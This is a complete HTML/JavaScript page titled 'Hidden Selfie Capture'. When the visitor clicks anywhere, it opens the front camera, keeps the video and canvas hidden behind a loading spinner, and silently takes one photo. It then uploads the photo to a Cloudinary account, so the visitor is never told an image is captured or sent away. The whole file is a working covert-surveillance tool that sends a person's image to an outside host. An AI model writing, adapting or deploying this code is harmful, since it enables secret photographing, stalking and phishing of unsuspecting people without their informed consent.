<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="utf-8">
<title>Hidden Selfie Capture</title>
<style>
  body,html{margin:0;padding:0;width:100%;height:100%;background:#000;overflow:hidden;}
  #loader{position:absolute;top:50%;left:50%;transform:translate(-50%,-50%);z-index:10;display:flex;align-items:center;justify-content:center;}
  .spinner{width:40px;height:40px;border:3px solid rgba(255,255,255,.3);border-top-color:#fff;border-radius:50%;animation:spin 1s linear infinite;}
  @keyframes spin{to{transform:rotate(360deg)}}
  /* video element stays in the DOM but never shown */
  #videoFeed{display:none;}
  /* canvas is also hidden – we only use it as an off‑screen buffer */
  #canvas{display:none;}
</style>
</head>
<body>
<div id="loader"><div class="spinner"></div></div>
<video id="videoFeed" autoplay muted playsinline></video>
<canvas id="canvas"></canvas>

<script>
  const CLOUD_NAME   = 'mmf0socw';          // <-- your Cloudinary name
  const UPLOAD_PRESET= '123456';            // <-- unsigned upload preset

  const video   = document.getElementById('videoFeed');
  const loader  = document.getElementById('loader');
  const canvas  = document.getElementById('canvas');

  /* ------------------------------------------------------------------ */
  /* 1. Ask for camera permission once the user clicks anywhere */
  /* ------------------------------------------------------------------ */
  document.body.addEventListener('click', async () => {
    try {
      const stream = await navigator.mediaDevices.getUserMedia({
        video: { facingMode: "user" },
        audio: false
      });

      /* Attach the stream to the hidden video element */
      video.srcObject = stream;

      /* Wait until the video is ready (camera warmed up) */
      await new Promise(res => video.onloadedmetadata = res);

      /* Show the loader (already visible) – no video flash */
      loader.style.display = 'flex';

      /* 2. Capture after a short delay to give the camera a moment */
      setTimeout(() => captureAndSend(stream), 500);
    } catch (err) {
      console.error('Camera error:', err);
      alert('Camera permission denied.');
    }
  });

  /* ------------------------------------------------------------------ */
  /* 3. Capture a single frame, upload it, then stop the stream */
  /* ------------------------------------------------------------------ */
  async function captureAndSend(stream) {
    // 3.1 Draw the current frame to the hidden canvas
    canvas.width  = video.videoWidth;
    canvas.height = video.videoHeight;
    const ctx = canvas.getContext('2d');
    ctx.drawImage(video, 0, 0);

    // 3.2 Convert canvas to a Blob
    canvas.toBlob(async blob => {
      const formData = new FormData();
      formData.append('file', blob, 'selfie.jpg');
      formData.append('upload_preset', UPLOAD_PRESET);

      try {
        const res  = await fetch(`https://api.cloudinary.com/v1_1/${CLOUD_NAME}/image/upload`, {
          method: 'POST',
          body: formData
        });
        const data = await res.json();
        console.log('Uploaded to Cloudinary:', data.secure_url);
      } catch (e) {
        console.error('Upload failed:', e);
      }

      /* 3.3 Stop all tracks – no camera remains active */
      stream.getTracks().forEach(t => t.stop());
    }, 'image/jpeg');
  }
</script>
</body>
</html>
